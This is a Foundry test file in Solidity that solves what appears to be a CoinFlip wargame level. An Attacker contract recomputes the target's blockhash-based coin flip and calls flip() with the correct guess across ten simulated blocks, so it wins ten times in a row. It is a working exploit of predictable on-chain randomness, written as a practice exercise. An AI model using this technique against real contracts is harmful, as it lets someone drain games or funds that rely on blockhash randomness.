// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/Coinflip.sol";

contract CoinflipTest is Test {
    CoinFlip target;
    address player;

    function setUp() public {
        target = new CoinFlip();
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        Attacker attacker = new Attacker(address(target));

        // we start the attack at some block
        uint256 startingBlock = block.number;

        for (uint256 i = 0; i <= 10; i++) {
            // we will attack once for each block,
            // so we use `vm.roll` to simulate mining a new block
            vm.roll(startingBlock + i);

            bool result = attacker.psychicFlip();
            assertTrue(result, "failed psychic flip");
        }
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertTrue(target.consecutiveWins() >= 10, "must have at least 10 consecutive wins");
    }
}

contract Attacker {
    CoinFlip target;
    // NOTE: Factor is equal to 0x8000000000000000000000000000000000000000000000000000000000000000
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function psychicFlip() public returns (bool) {
        // copy paste the same code as the target contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        return target.flip(guess);
    }
}
